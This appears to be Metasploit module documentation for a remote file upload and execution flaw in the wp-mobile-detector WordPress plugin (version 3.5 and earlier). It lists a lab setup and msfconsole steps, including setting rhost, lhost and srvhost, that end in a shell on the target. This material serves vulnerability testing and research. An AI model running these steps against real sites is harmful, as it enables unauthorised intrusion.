## Vulnerable Application

  wp-mobile-detector is a wordpress plugin which was removed from the wordpress site after this vulnerability
  was disclosed.  Version 3.5 and earlier can be directed to upload a file from a remote web server, and then
  the file can be executed by the client.

  Download [wp-mobile-detector](https://www.exploit-db.com/apps/bf8bdbac0b01e14788aa2d4a0d9c6971-wp-mobile-detector.3.5.zip)
  from Exploit-db since wordpress removed it.

  Due to its age, it may be difficult to install.  The install for the scenario later is:

  * Ubuntu 16.04.2
  * Apache 2.4.18
  * PHP 7
  * Wordpress 4.4.2

## Verification Steps

  Example steps in this format (is also in the PR):

  1. Install the application
  2. Start msfconsole
  3. Do: ```use exploit/unix/webapp/wp_mobile_detector_upload_execute```
  4. Do: ```set rhost [ip]```
  5. Do: ```set lhost [ip]```
  6. Do: ```set srvhost [ip]```
  7. Do: ```exploit```
  8. You should get a shell.
